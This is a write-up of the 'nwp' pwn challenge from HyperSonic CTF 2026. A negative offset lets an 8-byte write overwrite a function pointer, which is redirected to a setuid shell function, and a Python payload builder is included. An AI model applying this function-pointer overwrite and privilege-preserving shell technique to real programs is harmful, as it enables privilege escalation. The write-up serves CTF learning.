---
title: "HyperSonic CTF 2026 nwp Writeup"
description: "HyperSonic CTF 2026 nwp writeup"
---

# nwp

## Overview

`nwp` is a `pwn` challenge built around a small state machine. The program takes an offset as input, reads `8` bytes into a specific location in the `.bss` region, and then calls a function pointer.

The challenge setup:

- Category: `pwnable`
- Program format: stripped 64-bit ELF
- Mitigations: non-PIE, NX stack
- Goal: tamper with the function pointer to run a shell that can read the flag.

The key is the distance between the function pointer in `.bss` and the input buffer. The input address is computed as `base + offset` with no lower-bound check on `offset`, so you can overwrite the function pointer that sits in front of the buffer.

## Challenge analysis

The targets used below:

- `fp`: the function pointer at `0x403580`. In the normal flow it holds the address of a termination function.
- `buf`: the input target region starting at `0x403588`.
- `offset`: a signed integer read with `scanf("%d%*c", &offset)`.
- `priv_shell`: the function at `0x4014d8`. It fixes up privileges and then runs `/bin/sh`.

The program is stripped, so no function names remain. Still, following the `main` flow shows the state machine running this sequence.

```c
*(uint64_t *)0x403580 = 0x401326;

printf("offset> ");
scanf("%d%*c", &offset);

printf("input> ");
dst = (char *)0x403588 + (int64_t)offset;
__read_chk(0, dst, 8, object_size);

((void (*)(int))*(uint64_t *)0x403580)(0);
```

`fp` is initialized to `0x401326`. That function is a termination path leading to `_exit`. The program then reads `offset`, reads exactly `8` bytes at `buf + offset`, and finally calls the function pointed to by `fp`.

The address relationship matters here.

```text
fp  = 0x403580
buf = 0x403588
buf - fp = 8
```

So giving `offset = -8` makes the write target address exactly `fp`.

```text
dst = buf + offset
    = 0x403588 - 8
    = 0x403580
```

`__read_chk` is used, but on this path it does not block a negative offset. Even with `offset = -8`, an `8`-byte write is possible, so the entire function pointer can be changed to an address of our choosing.

The runtime environment also shapes the attack. The program runs with `setuid` set, and the flag can only be read with that privilege, so we need a path that makes `real uid/gid` equal to `effective uid/gid` before spawning the shell.

Among the functions not called in the normal flow, `0x4014d8` does the following.

```c
uid = geteuid();
setreuid(uid, uid);

gid = getegid();
setregid(gid, gid);

char *argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL);
```

The `/bin/sh` string is not stored in plaintext; it is reconstructed with a short XOR routine. The reconstructed result and the `execve` call make this function a suitable shell path for reading the flag.

## Core idea

The vulnerability is that `offset` is read as a signed integer and then used directly in the address calculation. The structure looks like it writes `8` bytes after `buf`, but a negative value also lets you write in front of the base address.

In this challenge, the function pointer about to be called sits right in front of `buf`.

```text
0x403580: fp
0x403588: buf
```

The two addresses are exactly `8` bytes apart, so a single `offset = -8` aligns the write location with `fp`. And the program calls that function pointer right after the write. So the work needed reduces to the following two things.

```text
1. Enter -8 as the offset.
2. Send 0x4014d8 in little-endian as the 8-byte input.
```

After `execve("/bin/sh", ...)` runs, the data still left in the input stream is read by the shell. So by appending a command after the function address, we get the result without interacting with the shell.

## Solution

### Step 1. Confirm the input flow in the state machine

After the program starts, `main` behaves like a state machine using a `jump table`. The detailed branches are obfuscated, but the flow actually needed for the attack follows this order.

```text
1. Disable I/O buffering.
2. Initialize fp to the termination function.
3. Read offset as a signed integer.
4. Read 8 bytes at buf + offset.
5. Call fp.
```

`offset` is a signed integer with no lower-bound check, so a negative value can be fed straight into the address calculation.

### Step 2. Compute the function-pointer overwrite location

The input buffer and the function pointer are both in `.bss`. The addresses are as follows.

```text
fp  = 0x403580
buf = 0x403588
```

The destination the program actually writes to is `buf + offset`. To overwrite `fp`, this value must be `0x403580`.

```text
buf + offset = fp
0x403588 + offset = 0x403580
offset = -8
```

So the first input is `-8`. The following `read` reads exactly `8` bytes, so we just send one overwrite address in `little-endian`.

### Step 3. Choose a shell path that preserves privileges

Several functions in the program lead to `execve`. The useful path among them is `0x4014d8`. Before running the shell, this function reads `effective uid/gid` and sets `real uid/gid` to the same values.

```text
setreuid(geteuid(), geteuid())
setregid(getegid(), getegid())
execve("/bin/sh", ...)
```

When a `setuid` program runs `/bin/sh`, privileges can drop unexpectedly. This path sets `real uid/gid` equal to `effective uid/gid` before `execve`, so it keeps the privileges needed to read the flag.

### Step 4. Use the remaining input as shell commands

The data consumed by `read` is only the `8`-byte function address. Any data appended after it is passed to standard input once the shell runs.

The final payload:

```text
"-8\n" || p64(0x4014d8) || "cat /flag.txt; exit\n"
```

The program reads `offset`, overwrites `fp` with `p64(0x4014d8)`, and then immediately calls `fp(0)`. The shell that runs afterwards processes the remaining commands and prints the flag.

## Exploit / Solver

The attack code sends the payload all at once. `scanf` consumes the newline after `-8`, and the next `read` uses the immediately following `8` bytes as the function pointer value.

```python
import struct


PRIV_SHELL = 0x4014D8


def build_payload(command: bytes = b"cat /flag.txt; exit\n") -> bytes:
    if not command.endswith(b"\n"):
        command += b"\n"

    return b"-8\n" + struct.pack("<Q", PRIV_SHELL) + command
```

Pass the payload above to a network connection or a local process as is. The addresses are fixed, so no leak is needed.

## Result

When run, the shell processed the supplied command and printed the following flag.

```text
hs{https://clickjacking.me/}
```
